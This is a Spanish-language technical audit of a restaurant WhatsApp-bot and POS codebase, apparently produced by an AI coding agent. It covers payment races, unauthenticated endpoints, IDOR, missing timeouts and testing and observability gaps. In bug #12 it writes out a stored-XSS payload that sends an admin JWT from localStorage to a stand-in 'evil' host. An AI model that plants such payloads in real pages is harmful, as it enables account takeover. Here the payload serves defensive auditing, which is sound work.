# Mesio — Auditoría Técnica

**Fecha:** 2026-04-27
**Auditor:** Staff Engineer (Claude Code, sesión multi-agente)
**Alcance:** `app/services/`, `app/routes/`, `app/repositories/`, `app/static/`, `tests/`, `alembic/`
**Método:** 5 auditorías en paralelo (bot runtime, POS/auth, repos/SQL, frontend/observability, patrones/dead code) + reconocimiento manual.
**Branch auditado:** `main` @ `08e92bd`.

---

## Resumen ejecutivo (lo que necesitas saber HOY)

El producto está vivo y funcional, pero la auditoría encontró **22 bugs de severidad ALTA o CRÍTICA** y **~40 inconsistencias de patrón** que aumentan la probabilidad de incidentes silenciosos. La buena noticia: la migración RLS está ~95% completa y el patrón Repository está consolidado. La mala: hay tres categorías de bug que probablemente ya están afectando ingresos sin que lo sepas.

**Las tres familias de problema más urgentes:**

1. **Pagos sin idempotencia ni serialización** — `pay_check`, Wompi callback + validación manual, y acumulación de loyalty pueden duplicar puntos / cobros / facturas bajo concurrencia normal de viernes 9pm.
2. **Endpoints sin auth tocando datos financieros** — `/cart/clear` borra carros sin token; `/payment/confirm` expone totales por order_id; `/api/public/restaurant-info?id=` permite enumerar tenants.
3. **El bot pierde mensajes silenciosamente** — `chat._send_wa_text` no reintenta (1 intento, 10s timeout) mientras `meta_api.send_text` sí (3 reintentos). Conviven dos clientes Meta y solo uno está bien.

Si pudieras arreglar **solo 3 cosas esta semana**, serían:

1. Agregar `AND status='open'` a `db_finalize_check_payment` + serializar concurrent pay_check (TOP 5 #1).
2. Quitar `/cart/clear` o ponerle auth + lock ownership.
3. Unificar el cliente Meta a `meta_api.send_text` con retry.

---

## 1. Inventario de Riesgo

### `app/services/` (servicios)

| Archivo | LOC | Funcs | Riesgo | Por qué |
|---|---:|---:|---|---|
| `agent.py` | 2,218 | ~30 | 🔴 **CRÍTICO** | Orquestador del bot. Cada turno de WhatsApp pasa por aquí. |
| `agent_salon.py` | 1,099 | ~10 | 🔴 **CRÍTICO** | State machine de checkout salón. Si rompe, no se cobra. |
| `agent_external.py` | 596 | ~3 | 🔴 **CRÍTICO** | Todos los pedidos delivery/pickup. |
| `agent_tools.py` | 446 | (defs) | 🟡 MEDIO | Schemas tool_use. Drift = LLM confundido. |
| `inbox_worker.py` | 484 | ~5 | 🔴 **CRÍTICO** | Si se traba, el bot deja de responder. |
| `state_store.py` | 545 | ~16 | 🔴 **CRÍTICO** | NPS/checkout/cart locks multi-worker. |
| `orders.py` | 414 | ~9 | 🔴 **CRÍTICO** | Carrito + Wompi link generation. |
| `transcription.py` | 236 | 2 | 🟡 MEDIO | Voice notes. Tiene fallback amigable. |
| `scheduler.py` | 572 | ~9 | 🟠 ALTO | Loops background, alertas, occupancy snapshots. |
| `meta_api.py` | 196 | 2 | 🟠 ALTO | Cliente Meta con retry. Hay duplicado en chat.py sin retry. |
| `database.py` | 572 | 11 | 🔴 **CRÍTICO** | Pool, infra. Limpio post-Fase 6. |
| `tenant_db.py` | 191 | 3 | 🔴 **CRÍTICO** | Wrapper RLS. Limpio. |
| `tenant_context.py` | 219 | 7 | 🔴 **CRÍTICO** | ContextVar + bypass helpers. Limpio. |
| `auth.py` | 303 | ~12 | 🟠 ALTO | bcrypt + fallback SHA-256 plano (legado peligroso). |
| `billing.py` | 1,307 | — | 🟡 MEDIO | DIAN. Out-of-scope esta auditoría. |
| `alerts.py` | ~150 | 7 | 🟡 MEDIO | 5 checks, cooldown 5min. Falta check Anthropic + scheduler watchdog. |
| `logging.py` | ~120 | 3 | 🟢 BAJO | structlog wrapper. Limpio. |

### `app/routes/`

| Archivo | LOC | Endpoints | Riesgo | Notas |
|---|---:|---:|---|---|
| `tables.py` | 1,768 | 36 | 🔴 **CRÍTICO** | POS. Tiene los peores bugs (concurrent pay, IDOR, stack-trace leak). |
| `orders_routes.py` | 587 | 9 | 🔴 **CRÍTICO** | `/cart/clear` sin auth, `/payment/confirm` sin auth. |
| `staff.py` | 1,142 | 38 | 🟠 ALTO | Payroll, IDOR potencial en export, PIN login enumeration handled. |
| `staff_webauthn.py` | 447 | 6 | 🟠 ALTO | Sign-counter no atómico con verify; rate limit débil. |
| `settings_routes.py` | 1,030 | 17 | 🟠 ALTO | Bug en role-comma string (admin con "owner,admin" denegado). |
| `staff_comms.py` | 691 | 21 | 🟡 MEDIO | Limpio. |
| `dashboard.py` | 712 | 31 | 🟠 ALTO | Mayoría públicos por diseño (HTML). `/api/public/restaurant-info` enumera. |
| `chat.py` | 601 | 6 | 🔴 **CRÍTICO** | `/api/media/{id}` sin timeout; `_send_wa_text` sin retry. |
| `deps.py` | 496 | (deps) | 🟠 ALTO | 4 patrones distintos para resolver restaurant. |
| `reservations.py` | 459 | 8 | 🟡 MEDIO | OK con `_scoped` deps. |
| `team_routes.py` | 302 | 5 | 🟡 MEDIO | "owner" in role substring match (low risk). |
| `billing.py` | 245 | 6 | 🟡 MEDIO | `software_pin` DIAN no enmascarado en GET config. |
| `inventory.py` | 214 | 12 | 🟢 BAJO | OK. |
| `auth_routes.py` | 101 | 3 | 🟡 MEDIO | Login rate-limited. Logout idempotente. |

### `app/repositories/`

| Archivo | LOC | Funcs | `pool.acquire()` raw | `bypass_tenant_scope` | Riesgo |
|---|---:|---:|---:|---:|---|
| `restaurant_repo.py` | 2,365 | 78 | 45 (mostly GLOBAL helpers by design) | 21 | 🟠 ALTO (god file) |
| `staff_repo.py` | 2,300 | 72 | 1 (manual SET ROLE) | 18 (4 questionable) | 🟠 ALTO |
| `tables_repo.py` | 1,635 | 85 | 0 | 4 (1 actively dangerous) | 🟠 ALTO |
| `stats_repo.py` | 1,409 | 19 | 0 | 0 | 🟡 MEDIO (float() en money math) |
| `orders_repo.py` | 680 | 17 | 2 (GLOBAL) | 0 | 🟡 MEDIO |
| `loyalty_repo.py` | 677 | 16 | 0 | 0 | 🟡 MEDIO (`float` typing + race accrue) |
| Resto | <600 c/u | varios | 0 | 0 | 🟢 BAJO |

**Estimado global:** 76 `pool.acquire()` raw remanentes; ~70 son GLOBAL por diseño (CRM, sessions, inbox, GLOBAL helpers). Los **45 en `restaurant_repo`** son funciones explícitamente GLOBAL (admin, billing stats, pre-resolución bot). RLS migration está sustancialmente cerrada.

---

## 2. Bugs Latentes (los que aún no han explotado)

### 🔥 TOP-12 más graves

> Marcados 🔥 los que más probablemente tumben el bot un viernes 9pm.

#### 1. 🔥 `pay_check` permite doble pago bajo concurrencia
**Archivo:** [tables.py:1278-1390](../app/routes/tables.py#L1278) → [tables_repo.py:797-808](../app/repositories/tables_repo.py#L797)
**Bug:** `db_finalize_check_payment` hace `UPDATE table_checks SET status='invoiced' WHERE id=$8` sin `AND status='open'` ni `SELECT FOR UPDATE`. Dos cajeros pagando el mismo check en 10 segundos pasan ambos el `db_get_check` → pasan ambos el if Python → ambos UPDATE → dos facturas DIAN, doble loyalty, payments JSON sobreescrito.
**Impacto:** Doble cobro, doble factura DIAN (algunos proveedores cobran por factura emitida), cliente furioso.

#### 2. 🔥 `_save_checkout_proposal` ignora `state["check_amounts"]`
**Archivo:** [agent_salon.py:191-219](../app/services/agent_salon.py#L191)
**Bug:** Cuando el cliente dice "una cuenta paga la Club Colombia ($8K), la otra el Camarón ($45K)", `state["check_amounts"]` se setea correctamente. Pero `_save_checkout_proposal` IGNORA ese estado y re-divide el subtotal en partes iguales (`per = quantize_money(subtotal_d / n)`). Cliente ve "$26K + $26K" en DB cuando esperaba "$8K + $45K".
**Impacto:** Mismatch entre lo prometido por el bot y lo que aparece en caja → discusión con cajero → escala a la owner.

#### 3. 🔥 `/cart/clear` sin auth ni ownership token
**Archivo:** [orders_routes.py:70-73](../app/routes/orders_routes.py#L70)
**Bug:** Endpoint público que recibe `phone` + `bot_number` y borra el carrito. Sin token, sin rate limit, sin lock ownership. Contradice Regla #5 (cart locks con UUID ownership).
**Impacto:** Cualquiera puede borrar el carrito de cualquier cliente del bot a voluntad. Sabotaje trivial.

#### 4. 🔥 `chat.py:133 /api/media/{media_id}` sin timeout
**Archivo:** [chat.py:133](../app/routes/chat.py#L133)
**Bug:** `httpx.AsyncClient(follow_redirects=True)` sin parámetro `timeout`. El cajero (Caja UI) carga thumbnails de comprobantes via este endpoint. Si Meta está lento, request pendiente para siempre → starvation del pool de conexiones uvicorn.
**Impacto:** Una hora pico con muchos comprobantes + Meta lento → web service no responde a NADIE. 4 workers comatosos.

#### 5. 🔥 `chat._send_wa_text` no reintenta + duplicado de `meta_api.send_text`
**Archivo:** [chat.py:276-292](../app/routes/chat.py#L276), vs [meta_api.py:send_text](../app/services/meta_api.py)
**Bug:** Conviven DOS clientes Meta — uno en `meta_api.py` con 3 retries, otro en `chat.py` con 1 intento. `_send_wa_text` se usa para rate-limit warnings, audio fallback, "comprobante recibido". Cualquier 503 transiente de Meta = mensaje perdido.
**Impacto:** Cliente nunca recibe el "vamos a verificar tu comprobante" y se queda colgado 30+ minutos.

#### 6. 🔥 `make_reservation` sin dedup guard
**Archivo:** [agent.py:924, 1119, 1451](../app/services/agent.py#L924)
**Bug:** `_ORDER_TOOLS = {"place_order", "create_delivery_order", "create_pickup_order"}` — `make_reservation` NO está en el set. Si Claude (o un retry de red) dispara dos `make_reservation` en 30s, ambos llegan a `db_add_reservation`. Se generan dos links Wompi, dos depósitos, dos reservas.
**Impacto:** Cliente paga doble depósito, segunda reserva bloquea mesa real. Money path con dinero real.

#### 7. 🔥 `loyalty_repo.db_accrue_loyalty_points` race + tipo float
**Archivo:** [loyalty_repo.py:71-110](../app/repositories/loyalty_repo.py#L71)
**Bug:**
- Parámetro `total_cop: float` (prohibido por CLAUDE.md).
- SELECT idempotency check (línea 90) → INSERT (línea 96) sin `FOR UPDATE`. Dos webhooks Wompi para el mismo `order_id` ambos pasan SELECT, ambos INSERT.
- ON CONFLICT solo protege la fila contadora, no el ledger.
**Impacto:** Doble crédito de puntos cada vez que Wompi reenvía un evento (frecuente).

#### 8. 🔥 Wompi callback + validación manual cuentan loyalty dos veces
**Archivo:** [orders_routes.py:106-247 + 400-522](../app/routes/orders_routes.py#L106)
**Bug:** Si el cajero "valida manualmente" un pedido (línea 458 emite `manual:{user_id}:{ts}Z` synthetic id) y el callback Wompi LLEGA DESPUÉS, ambos pasan a `db_confirm_payment` con event_ids distintos. El segundo no encuentra Wompi event duplicado, ejecuta loyalty accrual de nuevo (línea 217-240). Combinado con bug #7, los puntos pueden cuadruplicarse.
**Impacto:** Programa de loyalty regalando dinero.

#### 9. 🔥 `db_get_delivery_status_hash` lee delivery orders cross-tenant
**Archivo:** [tables_repo.py:1409-1414](../app/repositories/tables_repo.py#L1409)
**Bug:** Tiene `bypass_tenant_scope` y hace `SELECT id, status FROM orders WHERE order_type IN ('domicilio','recoger') AND created_at >= NOW() - INTERVAL '24 hours'` sin filtrar por org. Llamado desde [tables.py:511](../app/routes/tables.py#L511) desde una ruta tenant-autenticada. Existe la versión correcta `db_get_delivery_status_hash_for_restaurant(restaurant_id)` en línea 1418 — la equivocada está cableada.
**Impacto:** Polling cada 10s de la página de cocina enumera order IDs de TODOS los restaurantes Mesio.

#### 10. 🔥 `scheduler.py:252` NameError silencioso → occupancy_snapshot roto
**Archivo:** [scheduler.py:252](../app/services/scheduler.py#L252)
**Bug:** `bypass_tenant_scope("scheduler.occupancy_snapshot.list_locations")` se usa pero **NO se importa** en la función. NameError. El `try/except` exterior lo traga como "transient error", `continue`. Resultado: snapshots de ocupación rotos cada 15 min para TODOS los tenants. Silent failure.
**Impacto:** Dashboard de "tendencia de ocupación" vacío para todos los clientes y nadie se ha enterado.

#### 11. 🔥 `WOMPI_INTEGRITY_SECRET` cae a string vacío sin validación
**Archivo:** [orders.py:225](../app/services/orders.py#L225)
**Bug:** `secret = WOMPI_INTEGRITY_SECRET or ""`. Si la env var falta en Railway, la firma se calcula como `sha256("orderid+amount+currency+")`. Wompi rechaza el link → cliente recibe link de pago roto.
**Impacto:** Si alguien cambia/borra esa var en Railway, todos los pagos delivery se rompen y el bot dice "paga aquí" con link muerto.

#### 12. 🔥 Stored XSS via teléfono de cliente loyalty
**Archivo:** [dashboard-components.js:2430-2434](../app/static/js/dashboard-components.js#L2430)
**Bug:** Loyalty stats table interpola `${c.phone}` directo en `el.innerHTML` sin escape. Si un cliente registra el teléfono `<img src=x onerror=fetch('//evil/'+localStorage.rb_token)>` (improbable pero no imposible vía bot), exfiltra el JWT del admin que abre la página de fidelización.
**Impacto:** Compromise total de la cuenta del owner del restaurante.

### Otros bugs ALTOS (no top-12 pero importantes)

#### Race conditions / locks faltantes

- **`restaurant_repo.py:1256, 289, 296, 445`** — JSONB writes (`menu`, `features`) sin `FOR UPDATE` ni etag. Dos admins editando menú = last-writer-wins, edits silenciosamente perdidos. Catálogo v2 + cambios de precio simultáneos = exactamente este escenario.
- **`staff_webauthn.py:333-356`** — `verify_authentication_response` + `db_update_webauthn_sign_count` no están en una sola transacción con `FOR UPDATE`. Race window para sign-counter rollback.
- **`state_store.py:446`** rate_limit redis path: INCR + EXPIRE no atómicos. Si Redis muere entre INCR (count=1) y EXPIRE, key sin TTL → leak permanente.
- **`agent_salon.py:271-290`** — Auto-confirm de checks N de M: si falla check #2 de #3, checks #0 y #1 ya están en `paid` con propinas y se retorna `success=False`. Mesa medio-pagada, resto huérfano.

#### Manejo silencioso de errores

- **`tables.py:715`** — Raw `pool.acquire()` + SELECT contra `fiscal_invoices` envuelto en `except Exception: pass`. Viola Regla #15 (`except Exception: pass` prohibido). Esconde errores RLS reales.
- **`caja.js:53, 72`** — `_loadBillingConfig` y `loadMenu` tragan errores. Cajero abre POS, falla red, ve UI vacía sin mensaje. Procesa pagos con config stale.
- **`dashboard-core.js:120`** — `.catch(() => {})` en features fetch. `rb_restaurant` localStorage queda con flags stale para siempre.
- **26 catches vacíos** en 11 archivos JS.
- **`scheduler.py:81`** — `except Exception as e: log.error(... error=str(e)); return False` — silencia errores Meta y reminders quedan `pending`.

#### SQL queries problemáticas

- **`conversations_repo.py:122`** — `f"SELECT history FROM conversations WHERE {where} ORDER BY updated_at DESC"` SIN LIMIT. Lee JSONB completo. OOM con 50K conversaciones por tenant.
- **`reservations_repo.py:290`** — `SELECT *` sin LIMIT.
- **`restaurant_repo.py:325-329`** — Subquery correlacionada con `OR id=$1` → seq scan garantizado por cada `table_orders` row de los últimos 30 días.
- **`discounts_repo.py:175`, `loyalty_campaigns_repo.py:160`, `internal/crm_repo.py:162`** — `f"UPDATE ... SET {', '.join(set_clauses)} WHERE..."`. Auditados: keys whitelisted. Pero un cambio mal hecho introduce SQLi. Falta assert defensivo.

#### Endpoints sin auth (los más graves)

| Endpoint | Archivo:Línea | Riesgo |
|---|---|---|
| `POST /cart/clear` | [orders_routes.py:70](../app/routes/orders_routes.py#L70) | 🔥 ALTO: borra carro de cualquiera |
| `GET /payment/confirm?id=` | [orders_routes.py:249](../app/routes/orders_routes.py#L249) | ALTO: expone totales por order_id |
| `GET /api/public/restaurant-info?id=` | [dashboard.py:238](../app/routes/dashboard.py#L238) | MEDIO: enumera org_ids |

(Las páginas HTML públicas y `/menu`, `/api/public/menu/{bot}`, `/payment/wompi-webhook` son intencionalmente públicas y están OK.)

#### IDOR / Authorization missing

- **`tables.py:463 force_delete_conversation`** — `bypass_tenant_scope` sin verificar ownership del `phone`. Cualquier admin autenticado borra la conversación de otro tenant.
- **`tables.py:437 admin_call_waiter`** y **452 dismiss_waiter_alert** — Mismo patrón cross-tenant via bot_number.
- **`staff.py:188 pin-login`** — `body.restaurant_id` cliente-supplied. PIN común "1234" puede probarse contra staff_id de otros tenants.
- **`staff_repo.py:944 db_get_webauthn_credential`** + **1071-1086 db_get_breaks_for_shift** — Bypass keyed por UUID cliente. Seguridad depende 100% del call-site, sin defensa en profundidad.

#### Tipos / asunciones implícitas

- **`loyalty_repo.py:75`** `total_cop: float` (anti-CLAUDE.md).
- **`stats_repo.py:178, 334, 578, 666, 901, 908, 923, 1161, 1168`** — float() en aritmética de YoY/payroll growth. No es solo JSON boundary.
- **`tables.py:1311`** `to_decimal(sum(p.amount for p in body.payments))` — `p.amount` es float, sum corre como float, luego coerciona. Drift sub-cent en USD/EUR.
- **`tables.py:1065`, `1073`** — Pydantic `PaymentMethod.amount: float` y `PayCheckBody.tip_amount: float`. Deberían ser `Decimal`.
- **`agent_external.py:282-285`** — `cart_data["latitude"]` cast a float sin validar tipo origen.

#### Llamadas a APIs externas sin timeout / retry

| Llamada | Archivo:Línea | Timeout | Retry | Problema |
|---|---|---|---|---|
| Meta GET media | chat.py:133 | ❌ ninguno | ❌ | Pool starvation |
| Meta send (chat.py) | chat.py:190, 276-292 | ✅ 10s | ❌ 1 intento | Mensajes perdidos en 503 |
| Meta send (meta_api.py) | meta_api.py | ✅ | ✅ 3 intentos | OK |
| Whisper transcription | transcription.py:169 | ✅ | ✅ 3 intentos en 429 | OK pero sin backoff |
| Wompi link gen | orders.py:225 | n/a (calc) | n/a | Falta validar secret no vacío |
| Cloudinary upload | image_host.py | (browser-side) | n/a | OK |
| Anthropic API | agent.call_claude | ✅ con retry | ✅ 3 intentos | OK |

#### Polling agresivo (intervalos cuestionables)

- **`inbox_worker.py:70`** `_POLL_INTERVAL_EMPTY = 1.0` — OK pero alto. 4 workers × 1Hz = 4 RPS solo de polling cuando idle.
- **`staff-clock.js:1623-1627`** — 5 intervals de 60s independientes por terminal. 50 terminales = 250 RPM al backend solo de staff portal.
- **`equipo.js:505`** — `setInterval` raw (no `mesioInterval`), poll 60s ignorando visibility. Tabs en background siguen pegándole.

#### Tablas/columnas sin índice probable

Post-0048 (que agregó 7 índices), aún sospechosos:

- `staff_breaks(staff_id) WHERE break_end IS NULL` — usado por `db_get_open_break`.
- `webhook_inbox(provider, processed_at)` — el índice parcial existente cubre `WHERE processed_at IS NULL` pero no el filtro por `provider`.
- `nps_responses(org_id, location_id, created_at)` — usado por `db_branches_comparison`.
- `reservations(org_id, branch_id, status, created_at)` — `db_branches_comparison`.
- `loyalty_ledger(org_id, order_id) WHERE delta > 0` — idempotency check de accrue. Sin esto, cada acumulación = seq scan.

#### Migraciones implícitas / DDL en runtime

Buena noticia: **no se encontraron `CREATE TABLE IF NOT EXISTS` en runtime**. Los `db_init_*` no-ops son legacy stubs (~6 funciones); ya no crean tablas. Migración 0020 absorbió todo lo runtime-DDL.

Sospecha menor: 12 migraciones usan `op.execute(f"...")` con f-string interpolando nombres de tabla en for-loops. Riesgo bajo (los nombres son hardcoded), pero patrón frágil.

---

## 3. Inconsistencias de Patrón

### 🔴 Tres formas de obtener `branch_id` / `location_id`

1. Header `X-Branch-ID` (deps.py:153) — patrón viejo, owner override.
2. Header `X-Location-ID` (deps.py:458) — patrón nuevo, post-Wave-2.
3. **"Matriz invariant trick"**: `restaurant.get("location_id") or org_id` — vive en 5 sitios productivos:
   - [routes/stats.py](../app/routes/stats.py)
   - [routes/tables.py](../app/routes/tables.py)
   - [routes/settings_routes.py](../app/routes/settings_routes.py)
   - [repositories/orders_repo.py](../app/repositories/orders_repo.py)
   - [repositories/tables_repo.py](../app/repositories/tables_repo.py)

CLAUDE.md §9 lo prohíbe explícitamente. Para Orgs creadas POST Wave-2 deploy, devuelve location equivocado.

### 🔴 Cuatro formas de resolver el restaurante actual

1. `get_current_restaurant` (deps.py:104) — async function plana, sin scope.
2. `get_current_restaurant_scoped` (deps.py:173) — yield-based con `tenant_scope`.
3. `get_current_org` (deps.py:370) — plana, org-aware.
4. `get_current_org_scoped` (deps.py:417) — yield + scope.

**46 call-sites** usan la versión plana sin scope. Cualquier `db.db_get_X()` directo desde ahí dispara `TenantNotSetError`.

### 🟠 Cuatro formas de formatear money en JSON

| Patrón | Count | Ejemplo |
|---|---:|---|
| `float(quantize_money(val))` + `# JSON boundary` | ~8 | `tables.py:335`, `staff.py:283` |
| `float(raw_decimal)` directo | ~4 | `stats.py:458`, `marketing.py:67` |
| `Decimal` puro | 2 | `loyalty.py:102` |
| `int(Decimal)` | 1 | `settings_routes.py:410` |

Frontend tiene que adivinar tipo cada vez.

### 🟠 Dos clientes Meta WhatsApp

- `app/services/meta_api.py:send_text` — 3 retries, exponential backoff. ✅
- `app/routes/chat.py:_send_wa_text` (276-292) — 1 intento, 10s timeout. ❌

### 🟠 Tres patrones de tenant scope

- `tenant_scope(rid)` — estándar.
- `bypass_tenant_scope("reason")` — escape hatch con razón obligatoria.
- `bypass_tenant_scope_if_unset` (alias `_bypass_tenant`) — soft-bypass: no-op si ya hay scope. **PELIGRO** si se llama desde call-site sin scope previo (ejemplo: `/chat` POST endpoint en chat.py:75).

### Duplicaciones brutales

- **`_fmt_cop`** en agent.py:364 y agent_salon.py:31. Misma impl. Drift risk.
- **`_ofuscar_phone`** en agent.py:36 y agent_salon.py:24.
- **Checkout flow** duplicado entre agent.py y agent_salon.py (~40 LOC iguales: cart validation, payment enumeration, tip prompts).
- **Org-routing branch en agent_external.py** repetido para delivery (295-337 + 340-371 legacy) y pickup (376-432 + 433-507 legacy). ~200 LOC esperando cleanup post-Wave-2.
- **INSERT INTO orders** en orders_repo.py (3 sitios) + tables_repo.py (2 sitios). Posible `_insert_order_base()` extractable.
- **Auth check** en deps.py:47 (get_current_user) y deps.py:290 (require_page_access) duplican username→user lookup (~18 LOC).

### Dead code residual

- **Reads de `parent_restaurant_id`** en agent.py:1825, agent_external.py:277/375, loyalty.py:27/45. Columna dropeada en 0038. Branches siempre ejecutan, no rompe pero misleading. Tests AST guard solo cubren SQL strings, no lecturas dict.
- **6 funciones `db_init_*` no-op** en 4 repos. Llamadas inútilmente.
- **`_ensure_usage_table`** (restaurant_repo.py:1535) — no-op llamado por `db_increment_token_usage`/`db_increment_invoice_usage`.
- **`db_get_primary_location`** marcado deprecated en database.py:346.
- **`tip_distributions`** tabla legacy (no usada para cálculo activo) pero `db_save_tip_distribution`/`db_get_tip_distributions` siguen embarcados.
- **`is_main_restaurant` parameter** ignorado por todos los callers en `db_create_location()`.
- **`legacy_redirects.py`** — 89 LOC, pendiente verificar si tiene hits en logs últimos 30 días.

### Migración 0008 con duplicate

- `0008_webhook_inbox.py` declara `revision='0008'` ✓
- `0008_checkout_proposals.py` declara `revision='0010'` ✗ (filename engañoso)

Funcional (Alembic lee el campo, no el nombre) pero confunde grep.

---

## 4. Deuda de Testing

### Inventario

- **134 archivos de test** (excluyendo `tests/ai_sim/`).
- **81 archivos fuente** en `app/`. Ratio test-source: **1.65:1** (bueno para backend).
- **45 tests requieren `TEST_DATABASE_URL`** (integration tests).
- Baseline post-"No-v2": **1170 passed / 1 pre-existing failure / 27 skipped** con TEST_DATABASE_URL exportada (~9min). Sin DB ~1000 passed.

### Cobertura cualitativa

✅ **Sólida:** Cada repo tiene su `test_*_repo.py`. RLS isolation tests existen. Webhook resilience test existe.

❌ **No cubierto (críticos):**

#### Top 5 flujos críticos sin test

1. **Inbox 3-fase claim-then-ack** — Existen `test_inbox_metrics.py` y `test_inbox_worker_org_routing.py`, pero `grep "claim\|fetch_batch"` retorna 0. La regla #4 de CLAUDE.md (PROHIBIDO meter dispatch en `async with conn.transaction()`) no tiene regression test. Una refactor podría reintroducir el deadlock sin que nadie note.
2. **Cart lock token ownership** — `tests/e2e/test_stock_and_cartlock_lifecycle.py:406-429` adquiere y libera, pero NO verifica que: (a) release con UUID equivocado rechaza, (b) release con `token=None` rechaza. Regla #5 sin enforcement.
3. **End-to-end QR → mesa → cocina → caja → propina** — Pieces existen (`test_salon_qr_lifecycle.py`, `test_salon_split_checks_lifecycle.py`) pero ningún test hace el path completo con menú real, check real, propina real, distribución real.
4. **WhatsApp text → bot → tool exec → DB commit bajo DB caída intermitente** — `test_resilience_db_down.py` existe pero parcial. No cubre el chain completo con un fallo a mitad de transaction.
5. **Multi-tenant RLS leak via bypass sutil** — Existen `test_cross_tenant_rls_leak.py`, etc. Falta un test que escanee EVERY repo function en busca de `pool.acquire()` directo fuera de los excepciones documentadas. Hoy es enforcement por code review, no por guard.

### Tests omitidos con razón

- 17 tests Wave-2 transicional (obsoletos post-0038, marcados skip).
- 4 `test_staff_self_tips` (Sprint Y fixture issues).
- ~6 más en environment extras.

---

## 5. Puntos Únicos de Fallo

### Si Anthropic API cae...
- `agent.call_claude` tiene retry 3x con backoff para 429/503/529/timeout. ✅
- Reply vacío → fallback "¿En qué te puedo ayudar?" ✅
- **PERO:** No hay alerta automática "Anthropic ha estado fallando 10 minutos". El `services/alerts.py` cubre DB pool, inbox, dead letters, queue depth, error rate. **No cubre Anthropic.** Si Claude está mal por 30 minutos, el bot solo deja de responder con calidad y nadie se entera.

### Si Meta cambia un campo del payload...
- `chat.py` parsea defensivamente con `.get()` en la mayoría. ✅
- `audio` payload tiene `needs_transcription: true` flag específico — si Meta lo cambia, el worker dispatcher pierde el branch. ❌
- `entry: []` y `messages: []` listas vacías manejadas. ✅
- Firma inválida → 200 (correcto, evita retry storm). ✅

### Si la DB se queda sin conexiones...
- `alerts.py` chequea `pool.get_idle_size() == 0` cada 60s → CRITICAL alert al webhook. ✅
- `chat.py:133 /api/media/{id}` sin timeout → starvation propia (bug #4 arriba).
- `health.py /health/deep` siempre 200 para evitar Railway restart cascade. ✅

### Si scheduler falla silenciosamente...
- 🔴 **NADIE SE ENTERA.** [main.py:78-79](../app/main.py#L78) llama `start_scheduler()` que dispara `asyncio.create_task(_scheduler_loop())` SIN guardar la task ni `done_callback`. Si el loop tira excepción no manejada, la task se GC silenciosamente. No hay watchdog, no hay alerta.
- Compare con inbox worker (línea 92) que SÍ guarda `_inbox_task` y awaita en shutdown.
- Síntomas observables: weekly reports nunca se envían, occupancy snapshots dejan de poblarse, recordatorios de reserva no salen. Pero nadie monitorea estos.

### Si Redis cae...
- Fallback in-process por worker. ✅ documentado.
- Multi-worker: 4 leader concurrentes (idempotencia parcial via repos).
- `fallback warning` rate-limited 1/min/familia. ✅

---

## 6. Observabilidad

### Logging estructurado
✅ Todo via `structlog` (`app/services/logging.py`). `grep print(` en `app/` retorna 0 reales (solo coincidencias en strings CSS).

### "¿Qué pasó hoy con el bot?" — un solo lugar
- `/internal/monitoring` ([ops.py:23](../app/routes/internal/ops.py#L23)) — infra view, requiere `ADMIN_KEY`. Polling 10s.
- `/internal/analytics` ([analytics.py:29](../app/routes/internal/analytics.py#L29)) — KPIs business. Refresh 60s.

✅ Existe. 🟡 **Solo superadmin Mesio.** No hay vista per-restaurante para que el owner vea "cómo va mi bot ahorita". Para un owner técnicamente curioso, sería valor.

### Alertas automáticas (`services/alerts.py`)

| Check | Threshold | Severity |
|---|---|---|
| Dead letters | `count > 0` | HIGH |
| Pool exhaustion | `idle == 0` | CRITICAL |
| Inbox latency | `p95 > 500ms` | MEDIUM |
| Queue depth | `> 50 pending` | HIGH |
| Error rate | `> 10%` | HIGH |

Webhook fire-and-forget 5s timeout (Slack/Discord).

### Gaps de observabilidad (TOP 5 🚨)

1. 🚨 **Scheduler dies silently** — fix simple: guardar task + `add_done_callback` que loguee + dispare alerta.
2. 🚨 **No correlation_id end-to-end** — webhook → inbox → bot → DB → response no rastreables. "Mi bot no respondió a las 3:42pm" = imposible de reconstruir.
3. 🚨 **No log shipping** — Railway default retention (7d hobby, 30d Pro). No grep cross-deploy. No corpus para postmortems.
4. 🚨 **No alerta Anthropic down** — agente reintenta, pero si Anthropic está ratoneando 529s 10 min, el bot va lento y nadie alerta.
5. 🚨 **No bot LLM token accounting** — `agent.py` no loguea `tokens_in`/`tokens_out`. `ai_insights.py:154` SÍ lo hace — patrón a copiar. Hoy no se sabe gasto Anthropic per-restaurante.

### `/health/metrics` (en realidad `/api/internal/ops/metrics`)
Auth-protected (Bearer ADMIN_KEY). Retorna pool stats, inbox stats, business KPIs. Cada query try/excepted independientemente. ✅

### Lint frontend (`scripts/lint_frontend.py`)
✅ MOCK keywords, TODO/FIXME, fetch-against-FastAPI-routes, hardcoded names, money literals.
❌ **No chequea XSS** (`innerHTML = `${var}``) — el patrón más alto-impacto del codebase no está cubierto. **Una sola regex resolvería el bug #12.**
❌ No flagea catches vacíos (silent failures de caja).
❌ No diferencia `setInterval` raw vs `mesioInterval`.

---

## DUDAS PARA EL PM

Estas son cosas que NO entiendo del código y necesito que aclares antes de hacer cambios. No asumí.

1. **`agent_external.py:295-337` vs `:340-371`** — Hay dos paths paralelos para resolver delivery: "Org-based" y "legacy restaurants". CLAUDE.md dice Wave-2 está completo. ¿Por qué siguen ambos? ¿El "legacy" se ejecuta alguna vez en producción?

2. **`tip_distributions`** — CLAUDE.md dice "legacy, no se usa para cálculo activo" pero `db_save_tip_distribution` y `db_get_tip_distributions` siguen ahí. ¿Algún cliente legacy todavía lee de esa tabla? ¿Se puede borrar?

3. **`legacy_redirects.py`** — ¿Tienes acceso a logs de Railway de los últimos 30 días para ver si `internal.legacy_url` sigue disparando? Si zero hits → safe delete.

4. **`/api/public/restaurant-info?id=`** — ¿De dónde se llama? Lo encontré sin auth y enumera nombres de restaurantes por ID. ¿Es para landing pages? ¿Se puede mover a `/r/{slug}/info` con slug en lugar de ID numérico?

5. **`/cart/clear` sin auth** — ¿Quién lo usa? ¿Es para que el bot mismo limpie via internal? Si el bot lo llama, debería ir por `bypass_tenant_scope` server-side, no via HTTP público.

6. **`tables.py:1530 pos_quick_invoice` no decrementa inventario** — ¿Es por diseño (caja vende cosas que no pasan por el menú: "consumo cocina", "venta varia")? Si sí, OK. Si es bug, hay que arreglar.

7. **`X-Branch-ID` con value `"all"`** — CLAUDE.md menciona que retorna Matriz + Sucursales. ¿En qué contextos se usa "all"? ¿Es seguro permitirlo después de Wave-2?

8. **`tables.py:976 adjust_table_bill`** sin upper bound (`new_total >= 0`). ¿Es deliberado para que un cajero pueda "perdonar" la cuenta entera? Si sí, debería loguear AUDITORÍA explícita. Si no, es vector de fraude.

